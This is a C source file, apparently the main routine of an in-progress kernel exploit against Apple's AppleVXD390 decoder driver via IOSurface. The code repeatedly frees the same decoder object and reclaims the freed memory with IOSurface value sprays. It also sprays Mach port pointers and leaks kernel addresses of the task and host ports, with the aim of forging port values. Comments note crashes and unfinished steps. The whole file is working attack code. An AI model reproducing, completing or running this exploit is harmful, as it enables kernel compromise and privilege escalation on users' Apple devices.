#include <stdio.h>
#include <IOKit/IOKitLib.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>

#include "iosurface.h"
#include "applevxd390.h"
#include "mach-ports.h"
#include "gc.h"

int main(int argc, char* argv[]) {
	mach_port_t receive_port, target_port, own_task_port, 
	*before_ports, *after_ports, *spray_ports;
	uint32_t target_port_kp, own_task_port_kp, mach_host_self_kp;
	uint32_t target_port_page, target_port_offset;
	if (prepare_ports(&receive_port, &target_port, &own_task_port, 
			&before_ports, &after_ports, &spray_ports)) {
		printf("Failed to prepare ports\n");
		return 1;
	}

	io_connect_t iosurface_conn = openIOSurfaceConnection();
	if (iosurface_conn == MACH_PORT_NULL) {
		printf("Could not open connection to IOSurface\n");
		return 1;
	}
	uint32_t surface_id = createSurface(iosurface_conn);

	if (!surface_id) {
		printf("Could not create surface\n");
		return 1;
	}

	printf("surface ID: %x\n", surface_id);

	io_connect_t applevxd390_conn = createDecoder(surface_id);
	if (applevxd390_conn == MACH_PORT_NULL) {
		printf("Could not create decoder\n");
		return 1;
	}
	
	io_connect_t applevxd390_conn_2 = createDecoder(surface_id);
	if (applevxd390_conn_2 == MACH_PORT_NULL) {
		printf("Could not create decoder 2\n");
		return 1;
	}

	// first free
	if (!destroyDecoder(applevxd390_conn)) {
		printf("Could not destroy decoder\n");
		return 1;
	}

	// this should take up the freed spot
	if (setValueZeroes(iosurface_conn, surface_id)) {
		printf("Could not set value spray1\n");
		// return 1; // this always returns fail?????
	}
	
	// second free
	// this shouldnt crash immediately if the data got placed where our freed object was
	if (!destroyDecoder(applevxd390_conn)) {
		printf("Could not destroy decoder\n");
		// return 1; // this fails due to corrupted object
	}

	if (spray_port_pointer(receive_port, target_port, own_task_port)) {
		printf("Could not spray mach port pointers\n");
		return 1;
	}

	if (getValue(iosurface_conn, surface_id, &target_port_kp, &own_task_port_kp, &mach_host_self_kp)) {
		printf("Could not read values\n");
		return 1;
	}

	target_port_page = get_port_page(target_port_kp);
	target_port_offset = get_port_offset(target_port_kp);
	printf("page: 0x%x 0x%x\n", target_port_page, target_port_offset);
	
	// third free
	// this shouldnt crash immediately if the data got placed where our freed object was
	// TODO This causes spinlock panic
	destroyDecoder(applevxd390_conn);
	
	// // // this should take up the freed spot
	// TODO This causes spinlock panic
	setValuePorts(iosurface_conn, surface_id, target_port_kp, own_task_port_kp, mach_host_self_kp);

	if (getValue(iosurface_conn, surface_id, &target_port_kp, &own_task_port_kp, &mach_host_self_kp)) {
		printf("Could not read values\n");
		// return 1;
	}
	// printf("read our written values\n");

	printf("About to destroy ports\n");
	destroy_ports(receive_port, before_ports, after_ports);
	printf("After destroy ports\n");

	// force_GC();
	printf("After GC ports\n");

	while (true) {

	}

	return 0;
}
